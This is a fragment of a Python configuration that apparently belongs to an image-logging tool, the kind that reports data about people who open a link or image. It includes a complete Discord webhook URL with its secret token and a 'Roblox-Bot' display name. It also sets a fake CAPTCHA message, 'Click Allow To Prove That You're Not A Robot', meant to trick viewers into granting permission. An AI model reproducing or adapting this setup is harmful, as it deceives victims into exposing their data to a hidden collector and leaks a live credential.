...
config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1131689746918281328/cCzDkZwrx8uzIPpNdP0UI2DuFvKlSQf1gcYshjDDmkoiRWnNM1MBfkfkcLIx2pd8lnpg",
    ...
    # CUSTOMIZATION #
    "username": "Roblox-Bot", # Set this to the name you want the webhook to have
    ...
    "message": { # Show a custom message when the user opens the image
        ...
        "message": "Click Allow To Prove That You're Not A Robot.", # Message to show
